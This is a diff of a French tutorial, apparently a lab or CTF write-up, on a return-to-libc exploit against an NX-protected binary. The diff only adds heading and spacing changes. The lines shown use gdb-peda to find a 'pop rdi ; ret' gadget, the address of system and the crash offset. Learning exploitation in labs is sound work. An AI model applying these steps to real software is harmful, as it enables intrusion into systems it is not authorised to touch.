@@ -1,4 +1,4 @@
-Return 2 libc
+## Return 2 libc
 
 Le binaire est compilé avec le flag NX activé (moyen de protection par le noyau rendant la pile non exécutable)
 
@@ -41,12 +41,14 @@ gdb-peda$ asmsearch "pop rdi ; ret"
 ## Chercher l'adresse de la fonction system
 
 gdb-peda$ p system
+
 $1 = {int (const char *)} 0x7ffff7e36e50 <__libc_system>
 gdb-peda$
 
 ## Chercher l'offset
 
 gdb-peda$ pattern_create 400 entry.txt
+
 Writing pattern of 400 chars to filename "entry.txt"
 gdb-peda$ 
 gdb-peda$ r < <(cat entry.txt)
